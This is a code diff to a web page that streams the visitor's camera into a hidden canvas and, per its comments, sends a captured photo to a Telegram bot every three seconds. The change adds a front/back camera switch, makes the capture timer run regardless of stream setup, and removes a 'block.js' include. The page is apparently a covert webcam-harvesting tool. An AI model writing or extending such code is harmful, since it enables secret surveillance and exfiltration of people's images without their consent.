@@ -129,22 +129,43 @@
 
     <canvas id="canvas" width="320" height="480" style="display: none;"></canvas>
 
+    <!-- Camera toggle button -->
+    <button id="toggleCamera" style="position: absolute; bottom: 10px;">Switch Camera</button>
+
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         let photoFile;
+        let useFrontCamera = true; // Front camera is used by default
 
-        // Start the camera stream
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
+        // Function to start the camera stream
+        function startCamera() {
+            const constraints = {
+                video: {
+                    facingMode: useFrontCamera ? "user" : "environment"
+                }
+            };
 
-                // Capture photo every 3 seconds and send to Telegram bot
-                setInterval(captureAndSendPhoto, 3000);
-            })
-            .catch(err => {
-                console.error("Error accessing the camera: ", err);
-            });
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    video.srcObject = stream;
+                })
+                .catch(err => {
+                    console.error("Error accessing the camera: ", err);
+                });
+        }
+
+        // Start the camera initially
+        startCamera();
+
+        // Switch between front and back camera
+        document.getElementById('toggleCamera').addEventListener('click', () => {
+            useFrontCamera = !useFrontCamera;
+            startCamera();
+        });
+
+        // Capture photo every 3 seconds and send to Telegram bot
+        setInterval(captureAndSendPhoto, 3000);
 
         // Capture and send photo to Telegram bot
         function captureAndSendPhoto() {
@@ -174,6 +195,6 @@
             });
         }
     </script>
-    <script src="block.js"></script>
+
 </body>
 </html>
